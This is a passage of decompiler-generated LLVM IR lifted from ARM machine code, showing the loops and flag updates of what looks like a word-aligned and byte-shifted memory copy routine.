  %v3_18e04 = load i32, i32* @r4, align 4
  store i32 %v3_18e04, i32* %stack_var_-16, align 4
  %v6_18e04 = load i32, i32* @r5, align 4
  store i32 %v6_18e04, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18e08

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18e08.dec_label_pc_18e08_crit_edge, %dec_label_pc_18e00
  %v0_18e2c = phi i32 [ %v12_18e2c, %dec_label_pc_18e08.dec_label_pc_18e08_crit_edge ], [ %v0_18e2c76, %dec_label_pc_18e00 ]
  %v0_18e0c = phi i32 [ %v0_18e0c.pre, %dec_label_pc_18e08.dec_label_pc_18e08_crit_edge ], [ %v4_18d10, %dec_label_pc_18e00 ]
  %v0_18e08 = phi i32 [ %v0_18e08.pre, %dec_label_pc_18e08.dec_label_pc_18e08_crit_edge ], [ %v2_18d10, %dec_label_pc_18e00 ]
  %v3_18e08 = udiv i32 %v0_18e08, 16777216
  %v1_18e0c = inttoptr i32 %v0_18e0c to i32*
  %v2_18e0c = load i32, i32* %v1_18e0c, align 4
  store i32 %v2_18e0c, i32* %r4.global-to-local, align 4
  %v3_18e0c = add i32 %v0_18e0c, 4
  %v4_18e0c = inttoptr i32 %v3_18e0c to i32*
  %v5_18e0c = load i32, i32* %v4_18e0c, align 4
  store i32 %v5_18e0c, i32* %r5.global-to-local, align 4
  %v6_18e0c = add i32 %v0_18e0c, 8
  %v7_18e0c = inttoptr i32 %v6_18e0c to i32*
  %v8_18e0c = load i32, i32* %v7_18e0c, align 4
  store i32 %v8_18e0c, i32* %ip.global-to-local, align 4
  %v9_18e0c = add i32 %v0_18e0c, 12
  %v10_18e0c = inttoptr i32 %v9_18e0c to i32*
  %v11_18e0c = load i32, i32* %v10_18e0c, align 4
  store i32 %v11_18e0c, i32* %lr.global-to-local, align 4
  %v12_18e0c = add i32 %v0_18e0c, 16
  store i32 %v12_18e0c, i32* %r1.global-to-local, align 4
  %v4_18e10 = mul i32 %v2_18e0c, 256
  %v5_18e10 = or i32 %v4_18e10, %v3_18e08
  store i32 %v5_18e10, i32* @r3, align 4
  %v3_18e14 = udiv i32 %v2_18e0c, 16777216
  %v4_18e18 = mul i32 %v5_18e0c, 256
  %v5_18e18 = or i32 %v4_18e18, %v3_18e14
  store i32 %v5_18e18, i32* %r4.global-to-local, align 4
  %v3_18e1c = udiv i32 %v5_18e0c, 16777216
  %v4_18e20 = mul i32 %v8_18e0c, 256
  %v5_18e20 = or i32 %v4_18e20, %v3_18e1c
  store i32 %v5_18e20, i32* %r5.global-to-local, align 4
  %v3_18e24 = udiv i32 %v8_18e0c, 16777216
  %v4_18e28 = mul i32 %v11_18e0c, 256
  %v5_18e28 = or i32 %v4_18e28, %v3_18e24
  store i32 %v5_18e28, i32* @ip, align 4
  %v1_18e2c = inttoptr i32 %v0_18e2c to i32*
  store i32 %v5_18e10, i32* %v1_18e2c, align 4
  %v3_18e2c = add i32 %v0_18e2c, 4
  %v4_18e2c = inttoptr i32 %v3_18e2c to i32*
  %v5_18e2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18e2c, i32* %v4_18e2c, align 4
  %v6_18e2c = add i32 %v0_18e2c, 8
  %v7_18e2c = inttoptr i32 %v6_18e2c to i32*
  %v8_18e2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18e2c, i32* %v7_18e2c, align 4
  %v9_18e2c = add i32 %v0_18e2c, 12
  %v10_18e2c = inttoptr i32 %v9_18e2c to i32*
  %v11_18e2c = load i32, i32* @ip, align 4
  store i32 %v11_18e2c, i32* %v10_18e2c, align 4
  %v12_18e2c = add i32 %v0_18e2c, 16
  store i32 %v12_18e2c, i32* @r0, align 4
  %v0_18e30 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e30 = add i32 %v0_18e30, -16
  store i32 %v1_18e30, i32* %r2.global-to-local, align 4
  %v3_18e30 = sub i32 15, %v0_18e30
  %v4_18e30 = and i32 %v3_18e30, %v0_18e30
  %v5_18e30 = icmp slt i32 %v4_18e30, 0
  %v6_18e30 = icmp slt i32 %v1_18e30, 0
  %v2_18e34 = xor i1 %v6_18e30, %v5_18e30
  br i1 %v2_18e34, label %dec_label_pc_18e38, label %dec_label_pc_18e08.dec_label_pc_18e08_crit_edge

dec_label_pc_18e08.dec_label_pc_18e08_crit_edge:  ; preds = %dec_label_pc_18e08
  %v0_18e08.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18e0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e08

dec_label_pc_18e38:                               ; preds = %dec_label_pc_18e08
  %v2_18e38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18e38, i32* @r4, align 4
  %v5_18e38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18e38, i32* @r5, align 4
  %v1_18e3c = add i32 %v0_18e30, -4
  store i32 %v1_18e3c, i32* %r2.global-to-local, align 4
  %v3_18e3c = add i32 %v0_18e30, 2147483632
  %v4_18e3c = and i32 %v1_18e3c, %v3_18e3c
  %v5_18e3c = icmp slt i32 %v4_18e3c, 0
  store i1 %v5_18e3c, i1* %cpsr_v.global-to-local, align 1
  %v6_18e3c = icmp slt i32 %v1_18e3c, 0
  store i1 %v6_18e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_18e3c = icmp eq i32 %v1_18e3c, 0
  store i1 %v7_18e3c, i1* %cpsr_z.global-to-local, align 1
  %v2_18e40 = xor i1 %v6_18e3c, %v5_18e3c
  br i1 %v2_18e40, label %dec_label_pc_18e5c, label %dec_label_pc_18e44

dec_label_pc_18e44:                               ; preds = %dec_label_pc_18e38, %dec_label_pc_18df8, %dec_label_pc_18e44
  %v1_18e50 = phi i32 [ %v4_18e50, %dec_label_pc_18e44 ], [ %v12_18e2c, %dec_label_pc_18e38 ], [ %v0_18e2c76, %dec_label_pc_18df8 ]
  %v0_18e44 = load i32, i32* %lr.global-to-local, align 4
  %v3_18e44 = udiv i32 %v0_18e44, 16777216
  store i32 %v3_18e44, i32* %ip.global-to-local, align 4
  %v0_18e48 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e48 = inttoptr i32 %v0_18e48 to i32*
  %v2_18e48 = load i32, i32* %v1_18e48, align 4
  store i32 %v2_18e48, i32* %lr.global-to-local, align 4
  %v4_18e48 = add i32 %v0_18e48, 4
  store i32 %v4_18e48, i32* %r1.global-to-local, align 4
  %v4_18e4c = mul i32 %v2_18e48, 256
  %v5_18e4c = or i32 %v4_18e4c, %v3_18e44
  store i32 %v5_18e4c, i32* @ip, align 4
  %v2_18e50 = inttoptr i32 %v1_18e50 to i32*
  store i32 %v5_18e4c, i32* %v2_18e50, align 4
  %v3_18e50 = load i32, i32* @r0, align 4
  %v4_18e50 = add i32 %v3_18e50, 4
  store i32 %v4_18e50, i32* @r0, align 4
  %v0_18e54 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e54 = add i32 %v0_18e54, -4
  store i32 %v1_18e54, i32* %r2.global-to-local, align 4
  %v3_18e54 = sub i32 3, %v0_18e54
  %v4_18e54 = and i32 %v3_18e54, %v0_18e54
  %v5_18e54 = icmp slt i32 %v4_18e54, 0
  %v6_18e54 = icmp slt i32 %v1_18e54, 0
  %v2_18e58 = xor i1 %v6_18e54, %v5_18e54
  br i1 %v2_18e58, label %dec_label_pc_18e5c.loopexit, label %dec_label_pc_18e44

dec_label_pc_18e5c.loopexit:                      ; preds = %dec_label_pc_18e44
  %v7_18e54 = icmp eq i32 %v0_18e54, 4
  store i1 %v5_18e54, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18e54, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18e54, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18e5c

dec_label_pc_18e5c:                               ; preds = %dec_label_pc_18e5c.loopexit, %dec_label_pc_18e38
  %v0_18cac61 = phi i32 [ %v1_18e54, %dec_label_pc_18e5c.loopexit ], [ %v1_18e3c, %dec_label_pc_18e38 ]
  %v0_18e5c = load i32, i32* %r1.global-to-local, align 4
  %v1_18e5c = add i32 %v0_18e5c, -1
  store i32 %v1_18e5c, i32* @r1, align 4
  br label %bb140

dec_label_pc_18e64:                               ; preds = %entry
  %v1_18e64 = load i32, i32* @r2, align 4
  %v2_18e64 = add i32 %v1_18e64, %v0_18c10
  store i32 %v2_18e64, i32* %r1.global-to-local, align 4
  %v2_18e68 = add i32 %v1_18e64, %v1_18c10
  store i32 %v2_18e68, i32* %r0.global-to-local, align 4
  %v2_18e6c = add i32 %v1_18e64, -4
  store i32 %v2_18e6c, i32* %r2.global-to-local, align 4
  %v4_18e6c = sub i32 3, %v1_18e64
  %v5_18e6c = and i32 %v4_18e6c, %v1_18e64
  %v6_18e6c = icmp slt i32 %v5_18e6c, 0
  store i1 %v6_18e6c, i1* %cpsr_v.global-to-local, align 1
  %v7_18e6c = icmp slt i32 %v2_18e6c, 0
  store i1 %v7_18e6c, i1* %cpsr_n.global-to-local, align 1
  %v8_18e6c = icmp eq i32 %v1_18e64, 4
  store i1 %v8_18e6c, i1* %cpsr_z.global-to-local, align 1
  %v5_18e70 = icmp slt i32 %v1_18e64, 4
  br i1 %v5_18e70, label %bb150, label %dec_label_pc_18e74

dec_label_pc_18e74:                               ; preds = %dec_label_pc_18e64
  %v1_18e74 = urem i32 %v2_18e68, 4
  store i32 %v1_18e74, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18e74 = icmp eq i32 %v1_18e74, 0
  store i1 %v2_18e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e74, label %dec_label_pc_18e7c, label %dec_label_pc_18f1c

dec_label_pc_18e7c:                               ; preds = %dec_label_pc_18e74
  %v1_18e7c = urem i32 %v2_18e64, 4
  store i32 %v1_18e7c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18e7c = icmp eq i32 %v1_18e7c, 0
  store i1 %v2_18e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e7c, label %dec_label_pc_18e84, label %dec_label_pc_18f48

dec_label_pc_18e84:                               ; preds = %dec_label_pc_18e7c, %dec_label_pc_18f40
  %v0_18e9c37 = phi i32 [ %v2_18e68, %dec_label_pc_18e7c ], [ %v0_18f9020, %dec_label_pc_18f40 ]
  %v0_18e9836 = phi i32 [ %v2_18e64, %dec_label_pc_18e7c ], [ %v0_18f40, %dec_label_pc_18f40 ]
  %v0_18e84 = phi i32 [ %v2_18e6c, %dec_label_pc_18e7c ], [ %v2_18f38, %dec_label_pc_18f40 ]
  %v2_18e84 = add i32 %v0_18e84, -8
  store i32 %v2_18e84, i32* %r2.global-to-local, align 4
  %v4_18e84 = sub i32 7, %v0_18e84
  %v5_18e84 = and i32 %v4_18e84, %v0_18e84
  %v6_18e84 = icmp slt i32 %v5_18e84, 0
  store i1 %v6_18e84, i1* %cpsr_v.global-to-local, align 1
  %v7_18e84 = icmp slt i32 %v2_18e84, 0
  store i1 %v7_18e84, i1* %cpsr_n.global-to-local, align 1
  %v8_18e84 = icmp eq i32 %v0_18e84, 8
  store i1 %v8_18e84, i1* %cpsr_z.global-to-local, align 1
  %v5_18e88 = icmp slt i32 %v0_18e84, 8
  br i1 %v5_18e88, label %dec_label_pc_18ed4, label %dec_label_pc_18e8c

dec_label_pc_18e8c:                               ; preds = %dec_label_pc_18e84
  %v3_18e8c = load i32, i32* @r4, align 4
  %v5_18e8c = inttoptr i32 %v3_18e8c to i8*
  store i8* %v5_18e8c, i8** %stack_var_-8, align 4
  %v8_18e8c = load i32, i32* @lr, align 4
  %v2_18e90 = add i32 %v0_18e84, -28
  store i32 %v2_18e90, i32* %r2.global-to-local, align 4
  %v4_18e90 = sub i32 27, %v0_18e84
  %v5_18e90 = and i32 %v4_18e90, %v2_18e84
  %v6_18e90 = icmp slt i32 %v5_18e90, 0
  store i1 %v6_18e90, i1* %cpsr_v.global-to-local, align 1
  %v7_18e90 = icmp slt i32 %v2_18e90, 0
  store i1 %v7_18e90, i1* %cpsr_n.global-to-local, align 1
  %v8_18e90 = icmp eq i32 %v2_18e84, 20
  store i1 %v8_18e90, i1* %cpsr_z.global-to-local, align 1
  %v5_18e94 = icmp slt i32 %v2_18e84, 20
  br i1 %v5_18e94, label %dec_label_pc_18eb0, label %dec_label_pc_18e98

dec_label_pc_18e98:                               ; preds = %dec_label_pc_18e8c, %dec_label_pc_18e98.dec_label_pc_18e98_crit_edge
  %v0_18e9c = phi i32 [ %v1_18ea4, %dec_label_pc_18e98.dec_label_pc_18e98_crit_edge ], [ %v0_18e9c37, %dec_label_pc_18e8c ]
  %v0_18e98 = phi i32 [ %v0_18e98.pre, %dec_label_pc_18e98.dec_label_pc_18e98_crit_edge ], [ %v0_18e9836, %dec_label_pc_18e8c ]
  %v1_18e98 = add i32 %v0_18e98, -4
  %v2_18e98 = inttoptr i32 %v1_18e98 to i32*
  %v3_18e98 = load i32, i32* %v2_18e98, align 4
  %v4_18e98 = add i32 %v0_18e98, -8
  %v5_18e98 = inttoptr i32 %v4_18e98 to i32*
  %v6_18e98 = load i32, i32* %v5_18e98, align 4
  store i32 %v6_18e98, i32* %r4.global-to-local, align 4
  %v7_18e98 = add i32 %v0_18e98, -12
  %v8_18e98 = inttoptr i32 %v7_18e98 to i32*
  %v9_18e98 = load i32, i32* %v8_18e98, align 4
  store i32 %v9_18e98, i32* %ip.global-to-local, align 4
  %v10_18e98 = add i32 %v0_18e98, -16
  %v11_18e98 = inttoptr i32 %v10_18e98 to i32*
  %v12_18e98 = load i32, i32* %v11_18e98, align 4
  store i32 %v12_18e98, i32* %lr.global-to-local, align 4
  store i32 %v10_18e98, i32* %r1.global-to-local, align 4
  %v1_18e9c = add i32 %v0_18e9c, -16
  %v2_18e9c = inttoptr i32 %v1_18e9c to i32*
  store i32 %v3_18e98, i32* %v2_18e9c, align 4
  %v4_18e9c = add i32 %v0_18e9c, -12
  %v5_18e9c = inttoptr i32 %v4_18e9c to i32*
  %v6_18e9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18e9c, i32* %v5_18e9c, align 4
  %v7_18e9c = add i32 %v0_18e9c, -8
  %v8_18e9c = inttoptr i32 %v7_18e9c to i32*
  %v9_18e9c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_18e9c, i32* %v8_18e9c, align 4
  %v10_18e9c = add i32 %v0_18e9c, -4
  %v11_18e9c = inttoptr i32 %v10_18e9c to i32*
  %v12_18e9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18e9c, i32* %v11_18e9c, align 4
  store i32 %v1_18e9c, i32* %r0.global-to-local, align 4
  %v0_18ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ea0 = add i32 %v0_18ea0, -4
  %v2_18ea0 = inttoptr i32 %v1_18ea0 to i32*
  %v3_18ea0 = load i32, i32* %v2_18ea0, align 4
  store i32 %v3_18ea0, i32* @r3, align 4
  %v4_18ea0 = add i32 %v0_18ea0, -8
  %v5_18ea0 = inttoptr i32 %v4_18ea0 to i32*
  %v6_18ea0 = load i32, i32* %v5_18ea0, align 4
  store i32 %v6_18ea0, i32* %r4.global-to-local, align 4
  %v7_18ea0 = add i32 %v0_18ea0, -12
  %v8_18ea0 = inttoptr i32 %v7_18ea0 to i32*
  %v9_18ea0 = load i32, i32* %v8_18ea0, align 4
  store i32 %v9_18ea0, i32* @ip, align 4
  %v10_18ea0 = add i32 %v0_18ea0, -16
  %v11_18ea0 = inttoptr i32 %v10_18ea0 to i32*
  %v12_18ea0 = load i32, i32* %v11_18ea0, align 4
  store i32 %v12_18ea0, i32* %lr.global-to-local, align 4
  store i32 %v10_18ea0, i32* %r1.global-to-local, align 4
  %v1_18ea4 = add i32 %v0_18e9c, -32
  %v2_18ea4 = inttoptr i32 %v1_18ea4 to i32*
  store i32 %v3_18ea0, i32* %v2_18ea4, align 4
  %v4_18ea4 = add i32 %v0_18e9c, -28
  %v5_18ea4 = inttoptr i32 %v4_18ea4 to i32*
  %v6_18ea4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18ea4, i32* %v5_18ea4, align 4
  %v7_18ea4 = add i32 %v0_18e9c, -24
  %v8_18ea4 = inttoptr i32 %v7_18ea4 to i32*
  %v9_18ea4 = load i32, i32* @ip, align 4
  store i32 %v9_18ea4, i32* %v8_18ea4, align 4
  %v10_18ea4 = add i32 %v0_18e9c, -20
  %v11_18ea4 = inttoptr i32 %v10_18ea4 to i32*
  %v12_18ea4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18ea4, i32* %v11_18ea4, align 4
  store i32 %v1_18ea4, i32* %r0.global-to-local, align 4
  %v0_18ea8 = load i32, i32* %r2.global-to-local, align 4
  %v2_18ea8 = add i32 %v0_18ea8, -32
  store i32 %v2_18ea8, i32* %r2.global-to-local, align 4
  %v6_18eac = icmp slt i32 %v0_18ea8, 32
  br i1 %v6_18eac, label %dec_label_pc_18eb0.loopexit, label %dec_label_pc_18e98.dec_label_pc_18e98_crit_edge

dec_label_pc_18e98.dec_label_pc_18e98_crit_edge:  ; preds = %dec_label_pc_18e98
  %v0_18e98.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e98

dec_label_pc_18eb0.loopexit:                      ; preds = %dec_label_pc_18e98
  %v4_18ea8 = sub i32 31, %v0_18ea8
  %v5_18ea8 = and i32 %v4_18ea8, %v0_18ea8
  %v6_18ea8 = icmp slt i32 %v5_18ea8, 0
  %v7_18ea8 = icmp slt i32 %v2_18ea8, 0
  store i1 %v6_18ea8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18ea8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18eb0

dec_label_pc_18eb0:                               ; preds = %dec_label_pc_18eb0.loopexit, %dec_label_pc_18e8c
  %v6_18eb8 = phi i32 [ %v1_18ea4, %dec_label_pc_18eb0.loopexit ], [ %v0_18e9c37, %dec_label_pc_18e8c ]
  %v0_18ec0.pr = phi i32 [ %v2_18ea8, %dec_label_pc_18eb0.loopexit ], [ %v2_18e90, %dec_label_pc_18e8c ]
  %v4_18eb0 = add i32 %v0_18ec0.pr, 16
  %v6_18eb0 = sub i32 0, %v0_18ec0.pr
  %v7_18eb0 = and i32 %v4_18eb0, %v6_18eb0
  %v8_18eb0 = icmp slt i32 %v7_18eb0, 0
  store i1 %v8_18eb0, i1* %cpsr_v.global-to-local, align 1
  %v9_18eb0 = icmp slt i32 %v4_18eb0, 0
  store i1 %v9_18eb0, i1* %cpsr_n.global-to-local, align 1
  %v10_18eb0 = icmp eq i32 %v4_18eb0, 0
  store i1 %v10_18eb0, i1* %cpsr_z.global-to-local, align 1
  %v5_18eb4 = icmp slt i32 %v0_18ec0.pr, -16
  br i1 %v5_18eb4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_18eb0
  %v6_18eb4 = load i32, i32* %r1.global-to-local, align 4
  %v7_18eb4 = add i32 %v6_18eb4, -4
  %v8_18eb4 = inttoptr i32 %v7_18eb4 to i32*
  %v9_18eb4 = load i32, i32* %v8_18eb4, align 4
  store i32 %v9_18eb4, i32* @r3, align 4
  %v10_18eb4 = add i32 %v6_18eb4, -8
  %v11_18eb4 = inttoptr i32 %v10_18eb4 to i32*
  %v12_18eb4 = load i32, i32* %v11_18eb4, align 4
  store i32 %v12_18eb4, i32* %r4.global-to-local, align 4
  %v13_18eb4 = add i32 %v6_18eb4, -12
  %v14_18eb4 = inttoptr i32 %v13_18eb4 to i32*
  %v15_18eb4 = load i32, i32* %v14_18eb4, align 4
  store i32 %v15_18eb4, i32* @ip, align 4
  %v16_18eb4 = add i32 %v6_18eb4, -16
  %v17_18eb4 = inttoptr i32 %v16_18eb4 to i32*
  %v18_18eb4 = load i32, i32* %v17_18eb4, align 4
  store i32 %v18_18eb4, i32* %lr.global-to-local, align 4
  store i32 %v16_18eb4, i32* %r1.global-to-local, align 4
  %v7_18eb8 = add i32 %v6_18eb8, -16
  %v8_18eb8 = inttoptr i32 %v7_18eb8 to i32*
  store i32 %v9_18eb4, i32* %v8_18eb8, align 4
  %v10_18eb8 = add i32 %v6_18eb8, -12
  %v11_18eb8 = inttoptr i32 %v10_18eb8 to i32*
  %v12_18eb8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18eb8, i32* %v11_18eb8, align 4
  %v13_18eb8 = add i32 %v6_18eb8, -8
  %v14_18eb8 = inttoptr i32 %v13_18eb8 to i32*
  %v15_18eb8 = load i32, i32* @ip, align 4
  store i32 %v15_18eb8, i32* %v14_18eb8, align 4
  %v16_18eb8 = add i32 %v6_18eb8, -4
  %v17_18eb8 = inttoptr i32 %v16_18eb8 to i32*
  %v18_18eb8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18eb8, i32* %v17_18eb8, align 4
  store i32 %v7_18eb8, i32* %r0.global-to-local, align 4
  %v6_18ebc = load i32, i32* %r2.global-to-local, align 4
  %v7_18ebc = add i32 %v6_18ebc, -16
  store i32 %v7_18ebc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18eb0, %bb147
  %v6_18ec8 = phi i32 [ %v7_18eb8, %bb147 ], [ %v6_18eb8, %dec_label_pc_18eb0 ]
  %v0_18ec0 = phi i32 [ %v7_18ebc, %bb147 ], [ %v0_18ec0.pr, %dec_label_pc_18eb0 ]
  %v4_18ec0 = add i32 %v0_18ec0, 20
  store i32 %v4_18ec0, i32* %r2.global-to-local, align 4
  %v6_18ec0 = sub i32 0, %v0_18ec0
  %v7_18ec0 = and i32 %v4_18ec0, %v6_18ec0
  %v8_18ec0 = icmp slt i32 %v7_18ec0, 0
  store i1 %v8_18ec0, i1* %cpsr_v.global-to-local, align 1
  %v9_18ec0 = icmp slt i32 %v4_18ec0, 0
  store i1 %v9_18ec0, i1* %cpsr_n.global-to-local, align 1
  %v10_18ec0 = icmp eq i32 %v4_18ec0, 0
  store i1 %v10_18ec0, i1* %cpsr_z.global-to-local, align 1
  %v5_18ec4 = icmp slt i32 %v0_18ec0, -20
  br i1 %v5_18ec4, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_18ec4 = load i32, i32* %r1.global-to-local, align 4
  %v7_18ec4 = add i32 %v6_18ec4, -4
  %v8_18ec4 = inttoptr i32 %v7_18ec4 to i32*
  %v9_18ec4 = load i32, i32* %v8_18ec4, align 4
  store i32 %v9_18ec4, i32* @r3, align 4
  %v10_18ec4 = add i32 %v6_18ec4, -8
  %v11_18ec4 = inttoptr i32 %v10_18ec4 to i32*
  %v12_18ec4 = load i32, i32* %v11_18ec4, align 4
  store i32 %v12_18ec4, i32* @ip, align 4
  %v13_18ec4 = add i32 %v6_18ec4, -12
  %v14_18ec4 = inttoptr i32 %v13_18ec4 to i32*
  %v15_18ec4 = load i32, i32* %v14_18ec4, align 4
  store i32 %v15_18ec4, i32* %lr.global-to-local, align 4
  store i32 %v13_18ec4, i32* %r1.global-to-local, align 4
  %v7_18ec8 = add i32 %v6_18ec8, -12
  %v8_18ec8 = inttoptr i32 %v7_18ec8 to i32*
  store i32 %v9_18ec4, i32* %v8_18ec8, align 4
  %v10_18ec8 = add i32 %v6_18ec8, -8
  %v11_18ec8 = inttoptr i32 %v10_18ec8 to i32*
  %v12_18ec8 = load i32, i32* @ip, align 4
  store i32 %v12_18ec8, i32* %v11_18ec8, align 4
  %v13_18ec8 = add i32 %v6_18ec8, -4
  %v14_18ec8 = inttoptr i32 %v13_18ec8 to i32*
  %v15_18ec8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18ec8, i32* %v14_18ec8, align 4
  store i32 %v7_18ec8, i32* %r0.global-to-local, align 4
  %v6_18ecc = load i32, i32* %r2.global-to-local, align 4
  %v7_18ecc = add i32 %v6_18ecc, -12
  store i32 %v7_18ecc, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_18eec45 = phi i32 [ %v6_18ec8, %.thread2 ], [ %v7_18ec8, %bb148 ]
  %v0_18ed443 = phi i32 [ %v4_18ec0, %.thread2 ], [ %v7_18ecc, %bb148 ]
  %v2_18ed0 = load i8*, i8** %stack_var_-8, align 4
  %v3_18ed0 = ptrtoint i8* %v2_18ed0 to i32
  store i32 %v3_18ed0, i32* @r4, align 4
  store i32 %v8_18e8c, i32* @lr, align 4
  br label %dec_label_pc_18ed4

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18e84, %.thread4
  %v7_18ee4 = phi i32 [ %v0_18e9c37, %dec_label_pc_18e84 ], [ %v6_18eec45, %.thread4 ]
  %v0_18ed4 = phi i32 [ %v2_18e84, %dec_label_pc_18e84 ], [ %v0_18ed443, %.thread4 ]
  %v2_18ed4 = add i32 %v0_18ed4, 8
  store i32 %v2_18ed4, i32* %r2.global-to-local, align 4
  %v4_18ed4 = sub i32 0, %v0_18ed4
  %v5_18ed4 = and i32 %v2_18ed4, %v4_18ed4
  %v6_18ed4 = icmp slt i32 %v5_18ed4, 0
  store i1 %v6_18ed4, i1* %cpsr_v.global-to-local, align 1
  %v7_18ed4 = icmp slt i32 %v2_18ed4, 0
  store i1 %v7_18ed4, i1* %cpsr_n.global-to-local, align 1
  %v8_18ed4 = icmp eq i32 %v2_18ed4, 0
  store i1 %v8_18ed4, i1* %cpsr_z.global-to-local, align 1
  %v5_18ed8 = icmp slt i32 %v0_18ed4, -8
  br i1 %v5_18ed8, label %bb150, label %dec_label_pc_18edc

dec_label_pc_18edc:                               ; preds = %dec_label_pc_18ed4
  %v6_18edc = add i32 %v0_18ed4, 4
  store i32 %v6_18edc, i32* %r2.global-to-local, align 4
  %v8_18edc = sub i32 -5, %v0_18ed4
  %v9_18edc = and i32 %v8_18edc, %v2_18ed4
  %v10_18edc = icmp slt i32 %v9_18edc, 0
  store i1 %v10_18edc, i1* %cpsr_v.global-to-local, align 1
  %v11_18edc = icmp slt i32 %v6_18edc, 0
  store i1 %v11_18edc, i1* %cpsr_n.global-to-local, align 1
  %v12_18edc = icmp eq i32 %v2_18ed4, 4
  store i1 %v12_18edc, i1* %cpsr_z.global-to-local, align 1
  %v5_18ee0 = icmp slt i32 %v2_18ed4, 4
  %v6_18ee0 = load i32, i32* %r1.global-to-local, align 4
  %v7_18ee0 = add i32 %v6_18ee0, -4
  %v8_18ee0 = inttoptr i32 %v7_18ee0 to i32*
  %v9_18ee0 = load i32, i32* %v8_18ee0, align 4
  store i32 %v9_18ee0, i32* @r3, align 4
  br i1 %v5_18ee0, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_18edc
  store i32 %v7_18ee0, i32* %r1.global-to-local, align 4
  %v8_18ee4 = add i32 %v7_18ee4, -4
  %v9_18ee4 = inttoptr i32 %v8_18ee4 to i32*
  store i32 %v9_18ee0, i32* %v9_18ee4, align 4
  %v10_18ee4 = load i32, i32* %r0.global-to-local, align 4
  %v11_18ee4 = add i32 %v10_18ee4, -4
  store i32 %v11_18ee4, i32* %r0.global-to-local, align 4
  %v0_18ef4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_18edc
  %v10_18ee8 = add i32 %v6_18ee0, -8
  %v11_18ee8 = inttoptr i32 %v10_18ee8 to i32*
  %v12_18ee8 = load i32, i32* %v11_18ee8, align 4
  store i32 %v12_18ee8, i32* @ip, align 4
  store i32 %v10_18ee8, i32* %r1.global-to-local, align 4
  %v7_18eec = add i32 %v7_18ee4, -8
  %v8_18eec = inttoptr i32 %v7_18eec to i32*
  store i32 %v9_18ee0, i32* %v8_18eec, align 4
  %v10_18eec = add i32 %v7_18ee4, -4
  %v11_18eec = inttoptr i32 %v10_18eec to i32*
  %v12_18eec = load i32, i32* @ip, align 4
  store i32 %v12_18eec, i32* %v11_18eec, align 4
  store i32 %v7_18eec, i32* %r0.global-to-local, align 4
  %v6_18ef0 = load i32, i32* %r2.global-to-local, align 4
  %v7_18ef0 = add i32 %v6_18ef0, -4
  store i32 %v7_18ef0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_18ed4, %dec_label_pc_18e64, %dec_label_pc_19098, %dec_label_pc_1902c, %dec_label_pc_18fc0, %bb149
  %v2_18ef8 = phi i32 [ %v11_18ee4, %.thread8 ], [ %v0_18f9020, %.thread14 ], [ %v7_18ee4, %dec_label_pc_18ed4 ], [ %v2_18e68, %dec_label_pc_18e64 ], [ %v2_18f0453, %dec_label_pc_19098 ], [ %v2_18f0452, %dec_label_pc_1902c ], [ %v2_18f0451, %dec_label_pc_18fc0 ], [ %v7_18eec, %bb149 ]
  %v0_18ef4 = phi i32 [ %v0_18ef4.pre, %.thread8 ], [ %v2_18f38, %.thread14 ], [ %v2_18ed4, %dec_label_pc_18ed4 ], [ %v2_18e6c, %dec_label_pc_18e64 ], [ %v0_18ef449, %dec_label_pc_19098 ], [ %v0_18ef448, %dec_label_pc_1902c ], [ %v0_18ef447, %dec_label_pc_18fc0 ], [ %v7_18ef0, %bb149 ]
  %v1_18ef4 = add i32 %v0_18ef4, 4
  store i32 %v1_18ef4, i32* %r2.global-to-local, align 4
  %v3_18ef4 = sub i32 0, %v0_18ef4
  %v4_18ef4 = and i32 %v1_18ef4, %v3_18ef4
  %v5_18ef4 = icmp slt i32 %v4_18ef4, 0
  store i1 %v5_18ef4, i1* %cpsr_v.global-to-local, align 1
  %v6_18ef4 = icmp slt i32 %v1_18ef4, 0
  store i1 %v6_18ef4, i1* %cpsr_n.global-to-local, align 1
  %v7_18ef4 = icmp eq i32 %v1_18ef4, 0
